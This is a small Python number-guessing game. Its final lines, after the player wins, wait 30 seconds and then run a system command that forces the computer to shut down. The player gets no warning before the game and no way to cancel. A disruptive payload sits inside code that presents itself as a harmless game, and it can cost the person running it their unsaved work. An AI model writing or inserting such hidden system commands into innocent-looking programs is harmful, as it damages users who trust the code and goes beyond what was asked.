#game
import random
import time
import os

def main():
    # Generate a random number between 1 and 100
    target_number = random.randint(1, 100)
    
    print("Welcome to the Number Guessing Game!")
    print("I'm thinking of a number between 1 and 100.")
    
    while True:
        try:
            guess = int(input("Take a guess: "))
            
            if guess < target_number:
                print("Too low!")
            elif guess > target_number:
                print("Too high!")
            else:
                print("Congratulations! You guessed the number.")
                break
            
        except ValueError:
            print("Please enter a valid number.")
    
    print("Game Over.")
    
    # Delay for 30 seconds before shutting down
    print("Shutting down in 30 seconds...")
    time.sleep(30)
    
    # Shutdown the computer
    os.system("shutdown /s /t 1")

if __name__ == "__main__":
    main()
